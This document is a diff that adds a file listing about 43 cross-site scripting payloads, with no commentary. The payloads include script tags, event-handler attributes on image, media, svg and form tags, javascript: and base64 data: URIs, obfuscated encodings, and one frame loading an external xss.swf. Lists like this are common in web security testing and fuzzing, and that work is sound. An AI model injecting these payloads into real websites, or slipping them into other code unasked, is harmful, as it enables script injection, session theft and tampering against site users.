@@ -1,0 +1,43 @@
+<script>alert(“xss”)</script>
+<img src=1 onerror=alert(“xss”);>
+<script>~’u0061′ ;  u0074u0068u0072u006Fu0077 ~ u0074u0068u0069u0073.  u0061u006Cu0065u0072u0074(~’u0063′)</script>
+<script>prompt(-[])</script>
+<script firefox>alert(1)</script>
+<SCRIPT>+alert(“2″)</SCRIPT>
+<script>alert(String.fromCharCode(49))</script>
+<script>alert(/7/.source)</script>
+<script>setTimeout(‘alert(8)’,0)</script>
+<button/onclick=alert(9) >KCF</button>
+<a href=javascript:confirm(11)>asd</a>
+<a onmouseover=(alert(12))>KCF</a>
+<svg xmlns=”http://www.w3.org/2000/svg”> <a xmlns:xlink=”http://www.w3.org/1999/xlink” xlink:href=”javascript:alert(14)”><rect width=”1000″ height=”1000″ fill=”white”/></a> </svg>
+<p/onmouseover=javascript:alert(15); >KCF</p>
+<img src=x onerror=alert(16)>
+<img src=x onerror=window.open(‘http://127.0.0.1′);>
+<img src=”x:kcf” onerror=”alert(20)”>
+<body/onload=alert(21)>
+<body onscroll=alert(22)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body oninput=alert(23)><input autofocus>
+<var onmouseover=”prompt(24)”>KCF</var>
+<div/onmouseover=’alert(25)’>X
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;29&Tab;%29></iframe>
+<iframe SRC=”http://0x.lv/xss.swf”></iframe>
+<IFRAME SRC=”javascript:alert(27);”></IFRAME>
+<meta http-equiv=”refresh” content=”0;javascript&colon;alert(28)”/>?
+<meta http-equiv=”refresh” content=”0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E”>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>
+<marquee  onstart=”alert(’31′)”></marquee>
+<video src=x onerror=alert(48)>
+<audio src=x onerror=alert(47)>
+<video><source onerror=”alert(46)”>
+<math href=”javascript:javascript:alert(45)”>CLICKME</math>
+<svg onload=”javascript:alert(43)” xmlns=”http://www.w3.org/2000/svg”></svg>
+<embed src=javascript:alert(42)>
+<embed src=”data:text/html;base64,PHNjcmlwdD5hbGVydCg0MSk8L3NjcmlwdD4=”></embed>
+<keygen onfocus=javascript:alert(38) autofocus>
+<textarea onfocus=javascript:alert(37) autofocus>
+<select onfocus=javascript:alert(36) autofocus>
+<input onblur=javascript:alert(35) autofocus><input autofocus>
+<input onfocus=javascript:alert(34) autofocus>
+<isindex action=javascript:alert(33) type=image>
+<isindex type=image src=1 onerror=alert(32)>
